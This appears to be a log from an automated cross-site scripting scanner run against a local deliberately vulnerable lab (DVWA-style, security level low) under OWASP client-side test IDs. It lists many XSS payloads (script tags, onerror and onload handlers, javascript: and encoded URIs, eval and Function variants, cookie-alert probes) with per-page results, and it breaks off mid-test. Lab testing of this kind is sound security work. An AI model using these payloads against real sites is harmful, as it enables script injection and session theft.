@@ -1,0 +1,1826 @@
+2025-08-05 10:59:15.180337 | [+] Login successful (Status: 200)
+2025-08-05 10:59:15.224560 | [+] Security level set to low
+2025-08-05 10:59:15.224560 | ----- Starting OTG-CLIENT-001 (DOM-based XSS) -----
+2025-08-05 10:59:15.224560 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/xss_d/
+2025-08-05 10:59:15.241730 |   - Found potential DOM sink: document.write
+2025-08-05 10:59:15.241730 |   - Found potential DOM sink: location
+2025-08-05 10:59:15.241730 |   - Found potential DOM sink: location.href
+2025-08-05 10:59:15.241730 |   - Testing payload: #<script>alert('DOM XSS')</script>
+2025-08-05 10:59:15.248526 |   - Testing payload: #javascript:alert('XSS')
+2025-08-05 10:59:15.253803 |   - Testing payload: #" onmouseover="alert('XSS')"
+2025-08-05 10:59:15.257855 |   - Testing payload: #<img src=x onerror=alert('XSS')>
+2025-08-05 10:59:15.261935 |   - Testing payload: #<svg/onload=alert('XSS')>
+2025-08-05 10:59:15.266094 |   - Testing payload: #{alert('XSS')}
+2025-08-05 10:59:15.269399 |   - Testing payload: #javascript:alert(document.cookie)
+2025-08-05 10:59:15.270600 |   - Testing payload: #<script>alert`1`</script>
+2025-08-05 10:59:15.274372 |   - Testing payload: #<iframe srcdoc='<script>alert(1)</script>'>
+2025-08-05 10:59:15.278739 |   - Testing payload: #<img src='x' onerror='eval(location.hash.slice(1))'>
+2025-08-05 10:59:15.281633 |   - Testing payload: #document.write('<script>alert(1)</script>')
+2025-08-05 10:59:15.285743 |   - Testing payload: #<script defer>alert(1)</script>
+2025-08-05 10:59:15.287460 |   - Testing payload: #<script async>alert(1)</script>
+2025-08-05 10:59:15.287460 |   - Testing location.hash payload: default=<script>alert('XSS')</script>
+2025-08-05 10:59:15.287460 |   - Testing location.hash payload: default=javascript:alert('XSS')
+2025-08-05 10:59:15.296827 |   - Testing location.hash payload: default=1' onmouseover='alert(1)'
+2025-08-05 10:59:15.296827 |   - Testing location.hash payload: default=<img src=x onerror=alert(1)>
+2025-08-05 10:59:15.304965 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/client/
+2025-08-05 10:59:15.304965 |   - No obvious DOM sinks found in page source
+2025-08-05 10:59:15.304965 |   - Testing payload: #<script>alert('DOM XSS')</script>
+2025-08-05 10:59:15.304965 |   - Testing payload: #javascript:alert('XSS')
+2025-08-05 10:59:15.304965 |   - Testing payload: #" onmouseover="alert('XSS')"
+2025-08-05 10:59:15.304965 |   - Testing payload: #<img src=x onerror=alert('XSS')>
+2025-08-05 10:59:15.312023 |   - Testing payload: #<svg/onload=alert('XSS')>
+2025-08-05 10:59:15.313598 |   - Testing payload: #{alert('XSS')}
+2025-08-05 10:59:15.314608 |   - Testing payload: #javascript:alert(document.cookie)
+2025-08-05 10:59:15.315607 |   - Testing payload: #<script>alert`1`</script>
+2025-08-05 10:59:15.317606 |   - Testing payload: #<iframe srcdoc='<script>alert(1)</script>'>
+2025-08-05 10:59:15.318606 |   - Testing payload: #<img src='x' onerror='eval(location.hash.slice(1))'>
+2025-08-05 10:59:15.320059 |   - Testing payload: #document.write('<script>alert(1)</script>')
+2025-08-05 10:59:15.322064 |   - Testing payload: #<script defer>alert(1)</script>
+2025-08-05 10:59:15.323064 |   - Testing payload: #<script async>alert(1)</script>
+2025-08-05 10:59:15.325063 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/xss_r/
+2025-08-05 10:59:15.329259 |   - No obvious DOM sinks found in page source
+2025-08-05 10:59:15.329259 |   - Testing payload: #<script>alert('DOM XSS')</script>
+2025-08-05 10:59:15.332956 |   - Testing payload: #javascript:alert('XSS')
+2025-08-05 10:59:15.335462 |   - Testing payload: #" onmouseover="alert('XSS')"
+2025-08-05 10:59:15.338977 |   - Testing payload: #<img src=x onerror=alert('XSS')>
+2025-08-05 10:59:15.340977 |   - Testing payload: #<svg/onload=alert('XSS')>
+2025-08-05 10:59:15.343976 |   - Testing payload: #{alert('XSS')}
+2025-08-05 10:59:15.346563 |   - Testing payload: #javascript:alert(document.cookie)
+2025-08-05 10:59:15.350243 |   - Testing payload: #<script>alert`1`</script>
+2025-08-05 10:59:15.353181 |   - Testing payload: #<iframe srcdoc='<script>alert(1)</script>'>
+2025-08-05 10:59:15.357283 |   - Testing payload: #<img src='x' onerror='eval(location.hash.slice(1))'>
+2025-08-05 10:59:15.357283 |   - Testing payload: #document.write('<script>alert(1)</script>')
+2025-08-05 10:59:15.362423 |   - Testing payload: #<script defer>alert(1)</script>
+2025-08-05 10:59:15.362423 |   - Testing payload: #<script async>alert(1)</script>
+2025-08-05 10:59:15.362423 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/xss_s/
+2025-08-05 10:59:15.362423 |   - No obvious DOM sinks found in page source
+2025-08-05 10:59:15.362423 |   - Testing payload: #<script>alert('DOM XSS')</script>
+2025-08-05 10:59:15.362423 |   - Testing payload: #javascript:alert('XSS')
+2025-08-05 10:59:15.381217 |   - Testing payload: #" onmouseover="alert('XSS')"
+2025-08-05 10:59:15.381217 |   - Testing payload: #<img src=x onerror=alert('XSS')>
+2025-08-05 10:59:15.381217 |   - Testing payload: #<svg/onload=alert('XSS')>
+2025-08-05 10:59:15.381217 |   - Testing payload: #{alert('XSS')}
+2025-08-05 10:59:15.381217 |   - Testing payload: #javascript:alert(document.cookie)
+2025-08-05 10:59:15.395062 |   - Testing payload: #<script>alert`1`</script>
+2025-08-05 10:59:15.395062 |   - Testing payload: #<iframe srcdoc='<script>alert(1)</script>'>
+2025-08-05 10:59:15.395062 |   - Testing payload: #<img src='x' onerror='eval(location.hash.slice(1))'>
+2025-08-05 10:59:15.395062 |   - Testing payload: #document.write('<script>alert(1)</script>')
+2025-08-05 10:59:15.395062 |   - Testing payload: #<script defer>alert(1)</script>
+2025-08-05 10:59:15.410440 |   - Testing payload: #<script async>alert(1)</script>
+2025-08-05 10:59:15.410440 | ----- OTG-CLIENT-001 Test Completed -----
+
+2025-08-05 14:11:09.888412 | [+] Login successful (Status: 200)
+2025-08-05 14:11:09.945738 | [+] Security level set to low
+2025-08-05 14:11:17.201615 | [+] Login successful (Status: 200)
+2025-08-05 14:11:17.257269 | [+] Security level set to low
+2025-08-05 14:11:17.258267 | ----- Starting OTG-CLIENT-002 (JavaScript Execution) -----
+2025-08-05 14:11:17.258267 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/xss_d/
+2025-08-05 14:11:17.262983 |   - Found potential JS sink: document.write(
+2025-08-05 14:11:17.262983 |   - Testing fragment payload: javascript:alert(1)
+2025-08-05 14:11:17.267769 |     [✓] Script tag found with payload 'javascript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.267769 |   - Testing parameter payload: javascript:alert(1)
+2025-08-05 14:11:17.272115 |     [✓] Script tag found with payload 'javascript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.272638 |   - Testing fragment payload: javascript:alert(document.cookie)
+2025-08-05 14:11:17.276374 |     [✓] Script tag found with payload 'javascript:alert(document.cookie)' (URL fragment)
+2025-08-05 14:11:17.276374 |   - Testing parameter payload: javascript:alert(document.cookie)
+2025-08-05 14:11:17.280062 |     [✓] Script tag found with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:11:17.280062 |   - Testing fragment payload: javascript:prompt(1)
+2025-08-05 14:11:17.284209 |     [✓] Script tag found with payload 'javascript:prompt(1)' (URL fragment)
+2025-08-05 14:11:17.284209 |   - Testing parameter payload: javascript:prompt(1)
+2025-08-05 14:11:17.288537 |     [✓] Script tag found with payload 'javascript:prompt(1)' (URL parameter)
+2025-08-05 14:11:17.288537 |   - Testing fragment payload: javascript:confirm(1)
+2025-08-05 14:11:17.292696 |     [✓] Script tag found with payload 'javascript:confirm(1)' (URL fragment)
+2025-08-05 14:11:17.292696 |   - Testing parameter payload: javascript:confirm(1)
+2025-08-05 14:11:17.297845 |     [✓] Script tag found with payload 'javascript:confirm(1)' (URL parameter)
+2025-08-05 14:11:17.297845 |   - Testing fragment payload: alert(1)
+2025-08-05 14:11:17.302670 |     [✓] Script tag found with payload 'alert(1)' (URL fragment)
+2025-08-05 14:11:17.302670 |   - Testing parameter payload: alert(1)
+2025-08-05 14:11:17.306902 |     [✓] Script tag found with payload 'alert(1)' (URL parameter)
+2025-08-05 14:11:17.306902 |   - Testing fragment payload: confirm(1)
+2025-08-05 14:11:17.310909 |     [✓] Script tag found with payload 'confirm(1)' (URL fragment)
+2025-08-05 14:11:17.310909 |   - Testing parameter payload: confirm(1)
+2025-08-05 14:11:17.315193 |     [✓] Script tag found with payload 'confirm(1)' (URL parameter)
+2025-08-05 14:11:17.315193 |   - Testing fragment payload: prompt(1)
+2025-08-05 14:11:17.318433 |     [✓] Script tag found with payload 'prompt(1)' (URL fragment)
+2025-08-05 14:11:17.318433 |   - Testing parameter payload: prompt(1)
+2025-08-05 14:11:17.322433 |     [✓] Script tag found with payload 'prompt(1)' (URL parameter)
+2025-08-05 14:11:17.322433 |   - Testing fragment payload: jav&#x61;script:alert(1)
+2025-08-05 14:11:17.325568 |     [✓] Script tag found with payload 'jav&#x61;script:alert(1)' (URL fragment)
+2025-08-05 14:11:17.326573 |   - Testing parameter payload: jav&#x61;script:alert(1)
+2025-08-05 14:11:17.329567 |     [✓] Script tag found with payload 'jav&#x61;script:alert(1)' (URL parameter)
+2025-08-05 14:11:17.330575 |   - Testing fragment payload: jav%0ascript:alert(1)
+2025-08-05 14:11:17.333737 |     [✓] Script tag found with payload 'jav%0ascript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.333737 |   - Testing parameter payload: jav%0ascript:alert(1)
+2025-08-05 14:11:17.336738 |     [✓] Script tag found with payload 'jav%0ascript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.337742 |   - Testing fragment payload: javascript&#58;alert(1)
+2025-08-05 14:11:17.340247 |     [✓] Script tag found with payload 'javascript&#58;alert(1)' (URL fragment)
+2025-08-05 14:11:17.341247 |   - Testing parameter payload: javascript&#58;alert(1)
+2025-08-05 14:11:17.344890 |     [✓] Script tag found with payload 'javascript&#58;alert(1)' (URL parameter)
+2025-08-05 14:11:17.344890 |   - Testing fragment payload: eval('alert(1)')
+2025-08-05 14:11:17.348183 |     [✓] Script tag found with payload 'eval('alert(1)')' (URL fragment)
+2025-08-05 14:11:17.348183 |   - Testing parameter payload: eval('alert(1)')
+2025-08-05 14:11:17.352262 |     [✓] Script tag found with payload 'eval('alert(1)')' (URL parameter)
+2025-08-05 14:11:17.352262 |   - Testing fragment payload: setTimeout('alert(1)',0)
+2025-08-05 14:11:17.355533 |     [✓] Script tag found with payload 'setTimeout('alert(1)',0)' (URL fragment)
+2025-08-05 14:11:17.355533 |   - Testing parameter payload: setTimeout('alert(1)',0)
+2025-08-05 14:11:17.359646 |     [✓] Script tag found with payload 'setTimeout('alert(1)',0)' (URL parameter)
+2025-08-05 14:11:17.359646 |   - Testing fragment payload: setInterval('alert(1)',1000)
+2025-08-05 14:11:17.362908 |     [✓] Script tag found with payload 'setInterval('alert(1)',1000)' (URL fragment)
+2025-08-05 14:11:17.362908 |   - Testing parameter payload: setInterval('alert(1)',1000)
+2025-08-05 14:11:17.366356 |     [✓] Script tag found with payload 'setInterval('alert(1)',1000)' (URL parameter)
+2025-08-05 14:11:17.366356 |   - Testing fragment payload: Function('alert(1)')()
+2025-08-05 14:11:17.370547 |     [✓] Script tag found with payload 'Function('alert(1)')()' (URL fragment)
+2025-08-05 14:11:17.370547 |   - Testing parameter payload: Function('alert(1)')()
+2025-08-05 14:11:17.373546 |     [✓] Script tag found with payload 'Function('alert(1)')()' (URL parameter)
+2025-08-05 14:11:17.374547 |   - Testing fragment payload: new Function('alert(1)')()
+2025-08-05 14:11:17.377716 |     [✓] Script tag found with payload 'new Function('alert(1)')()' (URL fragment)
+2025-08-05 14:11:17.377716 |   - Testing parameter payload: new Function('alert(1)')()
+2025-08-05 14:11:17.380720 |     [✓] Script tag found with payload 'new Function('alert(1)')()' (URL parameter)
+2025-08-05 14:11:17.381721 |   - Testing fragment payload: onerror=alert;throw 1
+2025-08-05 14:11:17.385890 |     [✓] Script tag found with payload 'onerror=alert;throw 1' (URL fragment)
+2025-08-05 14:11:17.385890 |   - Testing parameter payload: onerror=alert;throw 1
+2025-08-05 14:11:17.389964 |     [✓] Script tag found with payload 'onerror=alert;throw 1' (URL parameter)
+2025-08-05 14:11:17.389964 |   - Testing fragment payload: onload=alert(1)
+2025-08-05 14:11:17.392964 |     [✓] Script tag found with payload 'onload=alert(1)' (URL fragment)
+2025-08-05 14:11:17.392964 |   - Testing parameter payload: onload=alert(1)
+2025-08-05 14:11:17.395965 |     [✓] Script tag found with payload 'onload=alert(1)' (URL parameter)
+2025-08-05 14:11:17.397228 |   - Testing fragment payload: onmouseover=alert(1)
+2025-08-05 14:11:17.400377 |     [✓] Script tag found with payload 'onmouseover=alert(1)' (URL fragment)
+2025-08-05 14:11:17.400377 |   - Testing parameter payload: onmouseover=alert(1)
+2025-08-05 14:11:17.404613 |     [✓] Script tag found with payload 'onmouseover=alert(1)' (URL parameter)
+2025-08-05 14:11:17.404613 |   - Testing fragment payload: data:text/javascript,alert(1)
+2025-08-05 14:11:17.407609 |     [✓] Script tag found with payload 'data:text/javascript,alert(1)' (URL fragment)
+2025-08-05 14:11:17.408749 |   - Testing parameter payload: data:text/javascript,alert(1)
+2025-08-05 14:11:17.411969 |     [✓] Script tag found with payload 'data:text/javascript,alert(1)' (URL parameter)
+2025-08-05 14:11:17.411969 |   - Testing fragment payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:11:17.414970 |     [✓] Script tag found with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL fragment)
+2025-08-05 14:11:17.415970 |   - Testing parameter payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:11:17.419185 |     [✓] Script tag found with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL parameter)
+2025-08-05 14:11:17.419185 |   - Testing fragment payload: vbscript:msgbox(1)
+2025-08-05 14:11:17.422424 |     [✓] Script tag found with payload 'vbscript:msgbox(1)' (URL fragment)
+2025-08-05 14:11:17.422424 |   - Testing parameter payload: vbscript:msgbox(1)
+2025-08-05 14:11:17.426501 |     [✓] Script tag found with payload 'vbscript:msgbox(1)' (URL parameter)
+2025-08-05 14:11:17.426501 |   - Testing fragment payload: livescript:alert(1)
+2025-08-05 14:11:17.429752 |     [✓] Script tag found with payload 'livescript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.429752 |   - Testing parameter payload: livescript:alert(1)
+2025-08-05 14:11:17.433257 |     [✓] Script tag found with payload 'livescript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.436279 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/xss_r/
+2025-08-05 14:11:17.439799 |   - No obvious JS sinks found in page source
+2025-08-05 14:11:17.439799 |   - Testing fragment payload: javascript:alert(1)
+2025-08-05 14:11:17.443033 |     [!] Possible JS injection - script error with payload 'javascript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.443033 |   - Testing parameter payload: javascript:alert(1)
+2025-08-05 14:11:17.447320 |     [!] Possible JS injection - script error with payload 'javascript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.447320 |   - Testing fragment payload: javascript:alert(document.cookie)
+2025-08-05 14:11:17.450982 |     [!] Possible JS injection - script error with payload 'javascript:alert(document.cookie)' (URL fragment)
+2025-08-05 14:11:17.450982 |   - Testing parameter payload: javascript:alert(document.cookie)
+2025-08-05 14:11:17.454987 |     [!] Possible JS injection - script error with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:11:17.454987 |   - Testing fragment payload: javascript:prompt(1)
+2025-08-05 14:11:17.457985 |     [!] Possible JS injection - script error with payload 'javascript:prompt(1)' (URL fragment)
+2025-08-05 14:11:17.457985 |   - Testing parameter payload: javascript:prompt(1)
+2025-08-05 14:11:17.461106 |     [!] Possible JS injection - script error with payload 'javascript:prompt(1)' (URL parameter)
+2025-08-05 14:11:17.462237 |   - Testing fragment payload: javascript:confirm(1)
+2025-08-05 14:11:17.465313 |     [!] Possible JS injection - script error with payload 'javascript:confirm(1)' (URL fragment)
+2025-08-05 14:11:17.465313 |   - Testing parameter payload: javascript:confirm(1)
+2025-08-05 14:11:17.469438 |     [!] Possible JS injection - script error with payload 'javascript:confirm(1)' (URL parameter)
+2025-08-05 14:11:17.469438 |   - Testing fragment payload: alert(1)
+2025-08-05 14:11:17.472647 |     [!] Possible JS injection - script error with payload 'alert(1)' (URL fragment)
+2025-08-05 14:11:17.472647 |   - Testing parameter payload: alert(1)
+2025-08-05 14:11:17.476489 |     [!] Possible JS injection - script error with payload 'alert(1)' (URL parameter)
+2025-08-05 14:11:17.476489 |   - Testing fragment payload: confirm(1)
+2025-08-05 14:11:17.480490 |     [!] Possible JS injection - script error with payload 'confirm(1)' (URL fragment)
+2025-08-05 14:11:17.480490 |   - Testing parameter payload: confirm(1)
+2025-08-05 14:11:17.484657 |     [!] Possible JS injection - script error with payload 'confirm(1)' (URL parameter)
+2025-08-05 14:11:17.484657 |   - Testing fragment payload: prompt(1)
+2025-08-05 14:11:17.489218 |     [!] Possible JS injection - script error with payload 'prompt(1)' (URL fragment)
+2025-08-05 14:11:17.489218 |   - Testing parameter payload: prompt(1)
+2025-08-05 14:11:17.492614 |     [!] Possible JS injection - script error with payload 'prompt(1)' (URL parameter)
+2025-08-05 14:11:17.492614 |   - Testing fragment payload: jav&#x61;script:alert(1)
+2025-08-05 14:11:17.496807 |     [!] Possible JS injection - script error with payload 'jav&#x61;script:alert(1)' (URL fragment)
+2025-08-05 14:11:17.496807 |   - Testing parameter payload: jav&#x61;script:alert(1)
+2025-08-05 14:11:17.501075 |     [!] Possible JS injection - script error with payload 'jav&#x61;script:alert(1)' (URL parameter)
+2025-08-05 14:11:17.501075 |   - Testing fragment payload: jav%0ascript:alert(1)
+2025-08-05 14:11:17.504233 |     [!] Possible JS injection - script error with payload 'jav%0ascript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.505263 |   - Testing parameter payload: jav%0ascript:alert(1)
+2025-08-05 14:11:17.508262 |     [!] Possible JS injection - script error with payload 'jav%0ascript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.509262 |   - Testing fragment payload: javascript&#58;alert(1)
+2025-08-05 14:11:17.512286 |     [!] Possible JS injection - script error with payload 'javascript&#58;alert(1)' (URL fragment)
+2025-08-05 14:11:17.512286 |   - Testing parameter payload: javascript&#58;alert(1)
+2025-08-05 14:11:17.515800 |     [!] Possible JS injection - script error with payload 'javascript&#58;alert(1)' (URL parameter)
+2025-08-05 14:11:17.515800 |   - Testing fragment payload: eval('alert(1)')
+2025-08-05 14:11:17.518810 |     [!] Possible JS injection - script error with payload 'eval('alert(1)')' (URL fragment)
+2025-08-05 14:11:17.519863 |   - Testing parameter payload: eval('alert(1)')
+2025-08-05 14:11:17.523510 |     [!] Possible JS injection - script error with payload 'eval('alert(1)')' (URL parameter)
+2025-08-05 14:11:17.523510 |   - Testing fragment payload: setTimeout('alert(1)',0)
+2025-08-05 14:11:17.526669 |     [!] Possible JS injection - script error with payload 'setTimeout('alert(1)',0)' (URL fragment)
+2025-08-05 14:11:17.527669 |   - Testing parameter payload: setTimeout('alert(1)',0)
+2025-08-05 14:11:17.530854 |     [!] Possible JS injection - script error with payload 'setTimeout('alert(1)',0)' (URL parameter)
+2025-08-05 14:11:17.530854 |   - Testing fragment payload: setInterval('alert(1)',1000)
+2025-08-05 14:11:17.534861 |     [!] Possible JS injection - script error with payload 'setInterval('alert(1)',1000)' (URL fragment)
+2025-08-05 14:11:17.534861 |   - Testing parameter payload: setInterval('alert(1)',1000)
+2025-08-05 14:11:17.538669 |     [!] Possible JS injection - script error with payload 'setInterval('alert(1)',1000)' (URL parameter)
+2025-08-05 14:11:17.539174 |   - Testing fragment payload: Function('alert(1)')()
+2025-08-05 14:11:17.542466 |     [!] Possible JS injection - script error with payload 'Function('alert(1)')()' (URL fragment)
+2025-08-05 14:11:17.542466 |   - Testing parameter payload: Function('alert(1)')()
+2025-08-05 14:11:17.545060 |     [!] Possible JS injection - script error with payload 'Function('alert(1)')()' (URL parameter)
+2025-08-05 14:11:17.545060 |   - Testing fragment payload: new Function('alert(1)')()
+2025-08-05 14:11:17.549956 |     [!] Possible JS injection - script error with payload 'new Function('alert(1)')()' (URL fragment)
+2025-08-05 14:11:17.549956 |   - Testing parameter payload: new Function('alert(1)')()
+2025-08-05 14:11:17.553776 |     [!] Possible JS injection - script error with payload 'new Function('alert(1)')()' (URL parameter)
+2025-08-05 14:11:17.554298 |   - Testing fragment payload: onerror=alert;throw 1
+2025-08-05 14:11:17.557559 |     [!] Possible JS injection - script error with payload 'onerror=alert;throw 1' (URL fragment)
+2025-08-05 14:11:17.558078 |   - Testing parameter payload: onerror=alert;throw 1
+2025-08-05 14:11:17.561240 |     [!] Possible JS injection - script error with payload 'onerror=alert;throw 1' (URL parameter)
+2025-08-05 14:11:17.561766 |   - Testing fragment payload: onload=alert(1)
+2025-08-05 14:11:17.565422 |     [!] Possible JS injection - script error with payload 'onload=alert(1)' (URL fragment)
+2025-08-05 14:11:17.565422 |   - Testing parameter payload: onload=alert(1)
+2025-08-05 14:11:17.568636 |     [!] Possible JS injection - script error with payload 'onload=alert(1)' (URL parameter)
+2025-08-05 14:11:17.569639 |   - Testing fragment payload: onmouseover=alert(1)
+2025-08-05 14:11:17.573038 |     [!] Possible JS injection - script error with payload 'onmouseover=alert(1)' (URL fragment)
+2025-08-05 14:11:17.573038 |   - Testing parameter payload: onmouseover=alert(1)
+2025-08-05 14:11:17.576865 |     [!] Possible JS injection - script error with payload 'onmouseover=alert(1)' (URL parameter)
+2025-08-05 14:11:17.576865 |   - Testing fragment payload: data:text/javascript,alert(1)
+2025-08-05 14:11:17.580101 |     [!] Possible JS injection - script error with payload 'data:text/javascript,alert(1)' (URL fragment)
+2025-08-05 14:11:17.580101 |   - Testing parameter payload: data:text/javascript,alert(1)
+2025-08-05 14:11:17.584465 |     [!] Possible JS injection - script error with payload 'data:text/javascript,alert(1)' (URL parameter)
+2025-08-05 14:11:17.584465 |   - Testing fragment payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:11:17.587690 |     [!] Possible JS injection - script error with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL fragment)
+2025-08-05 14:11:17.588691 |   - Testing parameter payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:11:17.592175 |     [!] Possible JS injection - script error with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL parameter)
+2025-08-05 14:11:17.592175 |   - Testing fragment payload: vbscript:msgbox(1)
+2025-08-05 14:11:17.595476 |     [!] Possible JS injection - script error with payload 'vbscript:msgbox(1)' (URL fragment)
+2025-08-05 14:11:17.595476 |   - Testing parameter payload: vbscript:msgbox(1)
+2025-08-05 14:11:17.599477 |     [!] Possible JS injection - script error with payload 'vbscript:msgbox(1)' (URL parameter)
+2025-08-05 14:11:17.599477 |   - Testing fragment payload: livescript:alert(1)
+2025-08-05 14:11:17.602956 |     [!] Possible JS injection - script error with payload 'livescript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.602956 |   - Testing parameter payload: livescript:alert(1)
+2025-08-05 14:11:17.606965 |     [!] Possible JS injection - script error with payload 'livescript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.613157 |     [✓] Possible JS execution with payload 'javascript:alert(1)' (form parameter name)
+2025-08-05 14:11:17.616160 |     [✓] Possible JS execution with payload 'javascript:alert(document.cookie)' (form parameter name)
+2025-08-05 14:11:17.619591 |     [✓] JS protocol found with payload 'javascript:prompt(1)' (form parameter name)
+2025-08-05 14:11:17.622758 |     [✓] JS protocol found with payload 'javascript:confirm(1)' (form parameter name)
+2025-08-05 14:11:17.626767 |     [✓] Possible JS execution with payload 'alert(1)' (form parameter name)
+2025-08-05 14:11:17.626767 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/client/
+2025-08-05 14:11:17.630768 |   - No obvious JS sinks found in page source
+2025-08-05 14:11:17.631937 |   - Testing fragment payload: javascript:alert(1)
+2025-08-05 14:11:17.633160 |     [!] HTTP 404 with payload 'javascript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.634158 |   - Testing parameter payload: javascript:alert(1)
+2025-08-05 14:11:17.635595 |     [!] HTTP 404 with payload 'javascript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.636113 |   - Testing fragment payload: javascript:alert(document.cookie)
+2025-08-05 14:11:17.637677 |     [!] HTTP 404 with payload 'javascript:alert(document.cookie)' (URL fragment)
+2025-08-05 14:11:17.637677 |   - Testing parameter payload: javascript:alert(document.cookie)
+2025-08-05 14:11:17.639228 |     [!] HTTP 404 with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:11:17.639758 |   - Testing fragment payload: javascript:prompt(1)
+2025-08-05 14:11:17.641336 |     [!] HTTP 404 with payload 'javascript:prompt(1)' (URL fragment)
+2025-08-05 14:11:17.641873 |   - Testing parameter payload: javascript:prompt(1)
+2025-08-05 14:11:17.643602 |     [!] HTTP 404 with payload 'javascript:prompt(1)' (URL parameter)
+2025-08-05 14:11:17.643602 |   - Testing fragment payload: javascript:confirm(1)
+2025-08-05 14:11:17.645168 |     [!] HTTP 404 with payload 'javascript:confirm(1)' (URL fragment)
+2025-08-05 14:11:17.645168 |   - Testing parameter payload: javascript:confirm(1)
+2025-08-05 14:11:17.646836 |     [!] HTTP 404 with payload 'javascript:confirm(1)' (URL parameter)
+2025-08-05 14:11:17.647840 |   - Testing fragment payload: alert(1)
+2025-08-05 14:11:17.649045 |     [!] HTTP 404 with payload 'alert(1)' (URL fragment)
+2025-08-05 14:11:17.649045 |   - Testing parameter payload: alert(1)
+2025-08-05 14:11:17.651056 |     [!] HTTP 404 with payload 'alert(1)' (URL parameter)
+2025-08-05 14:11:17.651056 |   - Testing fragment payload: confirm(1)
+2025-08-05 14:11:17.652054 |     [!] HTTP 404 with payload 'confirm(1)' (URL fragment)
+2025-08-05 14:11:17.652054 |   - Testing parameter payload: confirm(1)
+2025-08-05 14:11:17.654694 |     [!] HTTP 404 with payload 'confirm(1)' (URL parameter)
+2025-08-05 14:11:17.654694 |   - Testing fragment payload: prompt(1)
+2025-08-05 14:11:17.656723 |     [!] HTTP 404 with payload 'prompt(1)' (URL fragment)
+2025-08-05 14:11:17.656723 |   - Testing parameter payload: prompt(1)
+2025-08-05 14:11:17.658725 |     [!] HTTP 404 with payload 'prompt(1)' (URL parameter)
+2025-08-05 14:11:17.658725 |   - Testing fragment payload: jav&#x61;script:alert(1)
+2025-08-05 14:11:17.659723 |     [!] HTTP 404 with payload 'jav&#x61;script:alert(1)' (URL fragment)
+2025-08-05 14:11:17.659723 |   - Testing parameter payload: jav&#x61;script:alert(1)
+2025-08-05 14:11:17.662195 |     [!] HTTP 404 with payload 'jav&#x61;script:alert(1)' (URL parameter)
+2025-08-05 14:11:17.662195 |   - Testing fragment payload: jav%0ascript:alert(1)
+2025-08-05 14:11:17.664191 |     [!] HTTP 404 with payload 'jav%0ascript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.664191 |   - Testing parameter payload: jav%0ascript:alert(1)
+2025-08-05 14:11:17.665346 |     [!] HTTP 404 with payload 'jav%0ascript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.666346 |   - Testing fragment payload: javascript&#58;alert(1)
+2025-08-05 14:11:17.667462 |     [!] HTTP 404 with payload 'javascript&#58;alert(1)' (URL fragment)
+2025-08-05 14:11:17.667462 |   - Testing parameter payload: javascript&#58;alert(1)
+2025-08-05 14:11:17.669551 |     [!] HTTP 404 with payload 'javascript&#58;alert(1)' (URL parameter)
+2025-08-05 14:11:17.669551 |   - Testing fragment payload: eval('alert(1)')
+2025-08-05 14:11:17.671554 |     [!] HTTP 404 with payload 'eval('alert(1)')' (URL fragment)
+2025-08-05 14:11:17.671554 |   - Testing parameter payload: eval('alert(1)')
+2025-08-05 14:11:17.672552 |     [!] HTTP 404 with payload 'eval('alert(1)')' (URL parameter)
+2025-08-05 14:11:17.673562 |   - Testing fragment payload: setTimeout('alert(1)',0)
+2025-08-05 14:11:17.674564 |     [!] HTTP 404 with payload 'setTimeout('alert(1)',0)' (URL fragment)
+2025-08-05 14:11:17.674564 |   - Testing parameter payload: setTimeout('alert(1)',0)
+2025-08-05 14:11:17.676835 |     [!] HTTP 404 with payload 'setTimeout('alert(1)',0)' (URL parameter)
+2025-08-05 14:11:17.676835 |   - Testing fragment payload: setInterval('alert(1)',1000)
+2025-08-05 14:11:17.678901 |     [!] HTTP 404 with payload 'setInterval('alert(1)',1000)' (URL fragment)
+2025-08-05 14:11:17.678901 |   - Testing parameter payload: setInterval('alert(1)',1000)
+2025-08-05 14:11:17.679901 |     [!] HTTP 404 with payload 'setInterval('alert(1)',1000)' (URL parameter)
+2025-08-05 14:11:17.679901 |   - Testing fragment payload: Function('alert(1)')()
+2025-08-05 14:11:17.682401 |     [!] HTTP 404 with payload 'Function('alert(1)')()' (URL fragment)
+2025-08-05 14:11:17.683397 |   - Testing parameter payload: Function('alert(1)')()
+2025-08-05 14:11:17.684398 |     [!] HTTP 404 with payload 'Function('alert(1)')()' (URL parameter)
+2025-08-05 14:11:17.685397 |   - Testing fragment payload: new Function('alert(1)')()
